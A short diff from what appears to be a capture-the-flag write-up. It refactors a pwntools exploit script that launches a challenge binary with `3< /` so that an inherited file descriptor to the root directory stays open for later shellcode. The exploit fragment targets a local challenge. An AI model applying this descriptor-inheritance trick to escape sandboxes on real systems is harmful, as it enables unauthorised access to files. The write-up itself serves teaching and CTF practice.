@@ -91,13 +91,12 @@ The following script demonstrates the attack. We use shell redirection to ensure
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 # We use shell redirection to open '/' on FD 3 before the process starts.
 # The '3< /' syntax tells the shell to open '/' for reading on file descriptor 3.
 # This works because the challenge does not close inherited FDs.
-command = f"{exe} 3< /"
+command = f"{elf.path} 3< /"
 p = process(command, shell=True)
 
 # Refactored to shellcraft
